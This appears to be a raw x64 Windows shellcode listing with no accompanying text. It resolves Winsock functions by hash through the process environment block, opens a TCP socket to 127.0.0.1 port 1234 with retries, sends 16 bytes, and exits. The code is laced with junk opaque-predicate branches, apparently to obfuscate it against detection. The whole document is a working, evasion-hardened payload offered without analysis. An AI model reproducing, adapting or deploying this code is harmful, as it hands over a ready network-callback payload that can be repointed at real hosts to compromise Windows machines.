```asm
_start:
    cld
    and rsp, 0xfffffffffffffff0
    call L_d6
RET_a:
    push r9
    pushfq
    push rax
    xor eax, eax
    jnz bogus_1
    jmp real_1
bogus_1:
    nop
    mov rdx, rdx
real_1:
    pop rax
    popfq
    push r8
    push rdx
    push rcx
    push rsi
    xor rdx, rdx
    mov rdx, qword ptr gs:[rdx + 0x60]
    mov rdx, qword ptr [rdx + 0x18]
    mov rdx, qword ptr [rdx + 0x20]
L_21:
    mov rsi, qword ptr [rdx + 0x50]
    movzx rcx, word ptr [rdx + 0x4a]
    xor r9, r9
L_2d:
    xor rax, rax
    lodsb al, byte ptr [rsi]
    cmp al, 0x61
    jl L_37
    sub al, 0x20
L_37:
    ror r9d, 0xd
    add r9d, eax
    loop L_2d
    pushfq
    push rax
    xor eax, eax
    jnz bogus_2
    jmp real_2
bogus_2:
    nop
    mov rdx, rdx
real_2:
    pop rax
    popfq
    push rdx
    push r9
    mov rdx, qword ptr [rdx + 0x20]
    mov eax, dword ptr [rdx + 0x3c]
    add rax, rdx
    cmp word ptr [rax + 0x18], 0x20b
    jne L_cb
    mov eax, dword ptr [rax + 0x88]
    test rax, rax
    je L_cb
    add rax, rdx
    push rax
    mov ecx, dword ptr [rax + 0x18]
    mov r8d, dword ptr [rax + 0x20]
    add r8, rdx
    pushfq
    push rax
    xor eax, eax
    jnz bogus_3
    jmp real_3
bogus_3:
    nop
    mov rdx, rdx
real_3:
    pop rax
    popfq
L_72:
    jrcxz L_ca
    dec rcx
    mov esi, dword ptr [r8 + rcx*4]
    add rsi, rdx
    xor r9, r9
L_81:
    xor rax, rax
    lodsb al, byte ptr [rsi]
    ror r9d, 0xd
    add r9d, eax
    cmp al, ah
    jne L_81
    add r9, qword ptr [rsp + 8]
    cmp r9d, r10d
    jne L_72
    pop rax
    mov r8d, dword ptr [rax + 0x24]
    add r8, rdx
    mov cx, word ptr [r8 + rcx*2]
    mov r8d, dword ptr [rax + 0x1c]
    add r8, rdx
    mov eax, dword ptr [r8 + rcx*4]
    add rax, rdx
    pop r8
    pop r8
    pop rsi
    pop rcx
    pop rdx
    pop r8
    pop r9
    pop r10
    sub rsp, 0x20
    push r10
    jmp rax
L_ca:
    pop rax
    pushfq
    push rax
    xor eax, eax
    jnz bogus_4
    jmp real_4
bogus_4:
    nop
    mov rdx, rdx
real_4:
    pop rax
    popfq
L_cb:
    pop r9
    pop rdx
    mov rdx, qword ptr [rdx]
    jmp L_21
L_d6:
    pop rbp
    movabs r14, 0x32335f327377
    push r14
    mov r14, rsp
    sub rsp, 0x1a0
    mov r13, rsp
    movabs r12, 0x100007fd2040002
    push r12
    mov r12, rsp
    mov rcx, r14
    mov r10d, 0x726774c
    call rbp
    mov rdx, r13
    push 0x101
    pop rcx
    mov r10d, 0x6b8029
    call rbp
    push 0xa
    pop r14
    push 0
    pop r15
    push rax
    push rax
    xor r9, r9
    xor r8, r8
    inc rax
    mov rdx, rax
    inc rax
    mov rcx, rax
    mov r10d, 0xe0df0fea
    call rbp
    mov rdi, rax
L_142:
    push 0x10
    pop r8
    mov rdx, r12
    mov rcx, rdi
    mov r10d, 0x6174a599
    call rbp
    test eax, eax
    je L_167
    dec r14
    jne L_142
    dec r15
    jmp L_190
    call L_19c
L_167:
RET_167:
    xor r9, r9
    push 0x10
    pop r8
    call L_183
RET_173:
    insd dword ptr [rdi], dx
    xchg esi, eax
    sub eax, esi
    push rdx
    scasd eax, dword ptr [rdi]
    sub dword ptr gs:[rdi + rbp*4 - 0x4c1667a1], 5
L_183:
    pop rdx
    mov rcx, rdi
    mov r10, 0x5f38ebc2
    call rbp
L_190:
    mov rcx, rdi
    mov r10, 0x614d6e75
    call rbp
L_19c:
    pop rax
    push 0
    pop rcx
    mov r10, 0x56a2b5f0
    call rbp
```